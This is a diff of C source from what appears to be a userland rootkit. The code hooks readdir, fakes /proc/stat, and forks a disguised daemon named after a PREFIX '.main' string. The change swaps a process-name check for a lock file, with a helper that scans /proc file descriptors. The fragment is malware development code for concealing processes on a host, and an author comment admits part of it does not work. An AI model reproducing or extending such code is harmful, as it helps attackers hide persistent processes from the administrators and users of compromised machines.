@@ -126,40 +126,47 @@ int fake_proc_stat(void)
     return fd;
 }
 
-bool client_running(void)
+bool file_open(char *filename)
 {
     ORIG(readdir, false);
 
-    pid_t pid = getpid();
-    char cur_pid[64];
-    sprintf(cur_pid, "%d", pid);
-
-    struct dirent *dir;
     DIR *dirp = opendir("/proc");
-    char proc_name[1024];
+    struct dirent *dir;
     while ((dir = original_readdir(dirp)))
     {
-        if (strcmp(dir->d_name, cur_pid) != 0 && procname(dir->d_name, proc_name, sizeof(proc_name)) && strncmp(proc_name, PREFIX ".main", strlen(PREFIX ".main")) == 0)
+        char *pid = dir->d_name;
+        if (strspn(pid, "0123456789") != strlen(pid)) continue;
+        char fd_path[128];
+        sprintf(fd_path, "/proc/%s/fd", pid);
+        DIR *fdp = opendir(fd_path);
+        while ((dir = original_readdir(fdp)))
         {
-            return true;
+            sprintf(fd_path, "/proc/%s/fd/%s", pid, dir->d_name);
+            char buf[2048];
+            ssize_t ret = readlink(fd_path, buf, sizeof(buf));
+            if (ret == -1) continue;
+            buf[ret] = 0;
+            if (strcmp(buf, filename) == 0)
+            {
+                closedir(fdp);
+                closedir(dirp);
+                return true;
+            }
         }
+        closedir(fdp);
     }
-
+    closedir(dirp);
     return false;
 }
 
 // unreliable?
+// THIS DOES NOT WORK!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! GOD DAMN!!!!!! 
 bool start_client(void)
 {
-    if (client_running()) return false;
-    char buf[64];
-    prctl(PR_GET_NAME, buf);
-    prctl(PR_SET_NAME, PREFIX ".main");
-    if (client_running())
-    {
-        prctl(PR_SET_NAME, buf);
-        return false;
-    }
+    char *lock_name = "/" PREFIX ".lock";
+    int fd;
+    if (!file_open(lock_name)) remove(lock_name);
+    if ((fd = open(lock_name, O_CREAT | O_EXCL)) == -1) return false;
 
     pid_t pid;
     if (!(pid = fork()))
@@ -173,7 +180,7 @@ bool start_client(void)
             chdir("/");
             for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--)
             {
-                close(x);
+                if (x != fd) close(x);
             }
             prctl(PR_SET_NAME, PREFIX ".main");
 
@@ -186,8 +193,8 @@ bool start_client(void)
     }
 
     waitpid(pid, NULL, 0);
-    prctl(PR_SET_NAME, buf);
 
+    close(fd);
     return true;
 }
 
